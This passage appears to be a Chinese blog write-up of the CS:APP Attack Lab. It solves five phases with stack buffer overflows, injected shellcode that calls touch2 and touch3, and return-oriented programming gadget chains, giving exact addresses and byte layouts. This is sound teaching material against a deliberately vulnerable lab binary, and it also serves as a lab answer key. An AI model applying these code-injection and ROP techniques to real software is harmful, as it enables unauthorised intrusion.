# 3-Attack Lab
 ==**1. phase 1**==
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200721155140444.PNG)利用栈溢出覆盖getbuf函数的返回地址
**答案**  前五行是正常写入buf的数据，第六行是touch1的地址0x4017c0,用于覆盖getbuf()函数的正常返回地址。注意写入的数据不能是0x0a，这个数字表述“\n”,Get()函数遇到0xa会终止。
| 栈大小                                                       | 内容               |
| ------------------------------------------------------------ | ------------------ |
| 0x08                                                         | &touch1            |
| 0x28                                                         | buf数据 用0x00填充 |
| ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200721155444448.PNG) |                    |
| ==**2. phase 2**==                                           |                    |
| 注入可执行代码                                               |                    |
| 那么如何让程序去执行我们的代码呢？既然我们可以向栈中写入任意内容并且可以设置返回时跳转到的地址，那么我们就可以通过在栈中写入指令，再令从getbuf函数返回的地址为我们栈中指令的首地址，在指令中执行ret进行第二次返回，返回到touch2函数，就可以实现我们的目的。 |                    |
| 首先查看栈指针%rsp内容 栈的首地址为0x5561dc78                |                    |
| ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200721160835643.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTY2ODY3,size_16,color_FFFFFF,t_70) |                    |
| 在栈中写入如下指令对应的二进制内容                           |                    |
```asm
movl 0x59b997fa, %edi  ;touch2 参数 即cookie值
movq 0x5561dc98,%rsp  
retq ; ret指令会取出0x5561dc98的内容，并赋给pc，作为下一指令，
     ; 所以应当在0x5561dc98位置写上touch2函数的地址
```
利用gcc -c 和objdump生成对应指令的二进制代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200721161939686.PNG)
所以level2应当写入的内容为
| 栈地址     | 内容                      |
| ---------- | ------------------------- |
| 0x5561dca0 | 0x5561dc78 即该栈的首地址 |
| 0x5561dc98 | &touch2=0x4017ec          |
| 0x5561dc85 | 补零                      |
| 0x5561dc84 | retq                      |
| 0x5561dc7d | mov $0x5561dc98,%rsp      |
| 0x5561dc78 | mov $0x59b997fa,%edi      |

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200721162141868.PNG)
==**3. phase 3**==
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200721200203379.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTY2ODY3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200721200258147.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTY2ODY3,size_16,color_FFFFFF,t_70)
hexmatch()函数中字符串s="59b997fa"
strncmp()函数比较s的sval对应的字符串值，实际上比较的是ASCII码值，所以sval指向的字符串对应的ASCII应当与s相同。栈中保存与"59b997fa"相同的ASCII码值，并将%rdi保存其首地址。写入的数据为 35 39 62 39 39 37 66 61 00
注意 %rsp指针应当在数据部分之下，防止关键数据被覆盖

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200721201556679.PNG)
==**4. phase 4**==
rtarget的phase4和ctarget的phase4一样，要进入touch2函数，并且把cookie作为参数传入函数。唯一有区别的就是rtarget开启了栈随机化，使得我们不能定位我们插入的代码；即使能够定位，强行执行栈里的代码也会引发异常。
把cookie的值通过缓冲区溢出漏洞写入栈，然后再pop出来。 
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200722110602962.PNG)
函数getval_280的部分代码 58 90 c3
```shell
popq %rax	;58
nop			;90
retq		;c3
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200722110157940.PNG)函数setval_426的部分含有代码 48 89 c7 90 c3
```shell
movq %rax,%rdi  ;48 89 c7
nop				;90
retq			;c3
```

+

| 栈大小                                                       | 内容                              |
| ------------------------------------------------------------ | --------------------------------- |
| 0x08                                                         | &touch2 =0x4017ec                 |
| 0x08                                                         | &setval_426+2=0x4019c3+2=0x4019c5 |
| 0x08                                                         | cookie=0x59b997fa                 |
| 0x08                                                         | &getval_280+2=0x4019ca+2=0x4019cc |
| 0x28                                                         | buf数据                           |
| ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200722112736607.PNG) |                                   |
| ==**5. phase 5**==                                           |                                   |
```asm
movq %rsp,%rax		;&addval_190+3=0x401a06
movq %rax,%rdi		;&addval_273+2=0x4019a2
popq %rax		;0x4019ab
movl %eax,%edx	;0x4019dd
movl %edx,%ecx		;0x401a34
movl %ecx,%esi		;0x401a13
lea (%rdi,%rsi,1),%rax	;&add_xy=0x4019d6
movq %rax,%rdi		;0x4019a2
```
| 栈大小                                                       | 内容          |
| ------------------------------------------------------------ | ------------- |
| 0x8                                                          | 补零          |
| 0x8                                                          | cookie的ASCII |
| 0x8                                                          | &touch3       |
| 0x8                                                          | &addval_190+3 |
| 0x8                                                          | &addval_273+2 |
| 0x8                                                          | &addval_219+4 |
| 0x8                                                          | &getval_481+2 |
| 0x8                                                          | &getval_159+1 |
| 0x8                                                          | &addval_436+2 |
| 0x8                                                          | &add_xy       |
| 0x8                                                          | &addval_273+2 |
| 0x28                                                         | buf内容       |
| ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200722152411622.PNG) |               |